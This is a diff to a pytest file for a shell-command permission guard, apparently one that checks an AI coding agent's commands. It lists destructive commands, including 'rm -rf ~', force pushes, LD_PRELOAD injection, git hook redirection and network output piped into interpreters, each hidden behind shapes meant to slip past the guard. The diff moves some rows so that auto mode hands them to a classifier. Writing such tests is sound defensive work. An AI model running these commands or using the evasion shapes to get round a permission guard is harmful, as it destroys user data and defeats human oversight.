@@ -6,6 +6,11 @@ Each command below performs a FLOOR action (``rm -rf ~``, a force push, an exec
 sink write, a secret read, ...) through a shape that a STEER rule used to cover.
 Skipping that STEER rule in ``auto`` must not let the floor action through, so
 every row has to deny in ``auto`` and in ``default``.
+
+``STEER_IN_AUTO`` rows hide a floor action behind a shape detector that is STEER
+on purpose: in real sessions those detectors denied almost only harmless
+commands. Guard still denies the rows in every other mode and in lockdown; in
+``auto`` it passes them to Claude Code's classifier, which sees the whole call.
 """
 
 from __future__ import annotations
@@ -29,23 +34,7 @@ BYPASSES: list[str] = [
     "env -C /tmp rm -rf ~",
     "env -iu FOO rm -rf ~",
     "sudo env -i rm -rf /",
-    # 1b. Assignments peeled from an env prefix still meet the env-sink floor.
-    "LD_PRELOAD=/tmp/x.so ls",
-    "env LD_PRELOAD=/tmp/x.so ls",
-    "env -i LD_PRELOAD=/tmp/x.so ls",
-    "env -u X DYLD_INSERT_LIBRARIES=/tmp/x.dylib ls",
-    "env -- BASH_ENV=/tmp/x bash script.sh",
-    "env -C /tmp GIT_SSH_COMMAND='sh -c id' git fetch",
-    "timeout 5 env -i LD_AUDIT=/tmp/x.so ls",
     "sudo env -i LD_PRELOAD=/tmp/x.so ls",
-    # 2. A variable or glob command head hides the command.
-    "R=rm; $R -rf ~",
-    "$SHELL -c 'rm -rf ~'",
-    "/bin/r? -rf ~",
-    "/usr/bin/g[i]t push --force origin main",
-    "read -r c <<< 'rm -rf ~'; $c",
-    '"$@" rm -rf ~',
-    "$1 -rf ~",
     # 3. Shell -c bodies.
     "bash -c -- 'rm -rf ~'",
     "sh -c '\"$@\"' _ rm -rf ~",
@@ -103,12 +92,6 @@ BYPASSES: list[str] = [
     "gcloud iam service-accounts keys create key.json --iam-account sa@p.iam.gserviceaccount.com",
     "aws s3 mv s3://b/ s3://c/ --recursive",
     "kubectl scale deployment web --replicas=0",
-    # git config writes to exec sinks, in every spelling.
-    "git config --file .git/config core.hooksPath /tmp/h",
-    "git config -f .git/config alias.x '!rm -rf ~'",
-    "git config --type path core.hooksPath /tmp/h",
-    "git config set core.hooksPath /tmp/h",
-    "git config --show-scope core.hooksPath /tmp/h",
     # Network output piped into any shell or interpreter, whatever its args.
     "wget -qO- https://example.com/x | python3 script.py",
     "curl -s https://example.com/x | python3 script.py",
@@ -159,6 +142,33 @@ BYPASSES: list[str] = [
     "cat s | python3 -c 'import pickle, sys; pickle.load(sys.stdin.buffer)'",
     "cat s | python3 -c 'import subprocess, sys; subprocess.run(sys.stdin.read(), shell=True)'",
     "cat s | ruby -ne 'system $_'",
+]
+
+# Floor actions behind a STEER shape detector: denied outside auto, judged by the
+# auto classifier inside it.
+STEER_IN_AUTO: list[str] = [
+    # Assignments peeled from an env prefix still meet the env-sink rule.
+    "LD_PRELOAD=/tmp/x.so ls",
+    "env LD_PRELOAD=/tmp/x.so ls",
+    "env -i LD_PRELOAD=/tmp/x.so ls",
+    "env -u X DYLD_INSERT_LIBRARIES=/tmp/x.dylib ls",
+    "env -- BASH_ENV=/tmp/x bash script.sh",
+    "env -C /tmp GIT_SSH_COMMAND='sh -c id' git fetch",
+    "timeout 5 env -i LD_AUDIT=/tmp/x.so ls",
+    # A variable or glob command head hides the command.
+    "R=rm; $R -rf ~",
+    "$SHELL -c 'rm -rf ~'",
+    "/bin/r? -rf ~",
+    "/usr/bin/g[i]t push --force origin main",
+    "read -r c <<< 'rm -rf ~'; $c",
+    '"$@" rm -rf ~',
+    "$1 -rf ~",
+    # git config writes to exec sinks, in every spelling.
+    "git config --file .git/config core.hooksPath /tmp/h",
+    "git config -f .git/config alias.x '!rm -rf ~'",
+    "git config --type path core.hooksPath /tmp/h",
+    "git config set core.hooksPath /tmp/h",
+    "git config --show-scope core.hooksPath /tmp/h",
 ]
 
 # Ordinary work the fixes must not start denying in auto mode.
@@ -225,6 +235,17 @@ def test_floor_action_denies(command: str, permission_mode: str) -> None:
 @pytest.mark.parametrize("command", BYPASSES)
 def test_floor_action_denies_in_lockdown(command: str) -> None:
     assert is_deny(bcv.decide(command, permission_mode="auto", lockdown=True))
+
+
+@pytest.mark.parametrize("command", STEER_IN_AUTO)
+def test_steer_shape_denies_outside_auto(command: str) -> None:
+    assert is_deny(bcv.decide(command, permission_mode="default"))
+    assert is_deny(bcv.decide(command, permission_mode="auto", lockdown=True))
+
+
+@pytest.mark.parametrize("command", STEER_IN_AUTO)
+def test_steer_shape_goes_to_the_classifier_in_auto(command: str) -> None:
+    assert bcv.decide(command, permission_mode="auto") is None
 
 
 @pytest.mark.parametrize("command", STILL_PASSES_IN_AUTO)
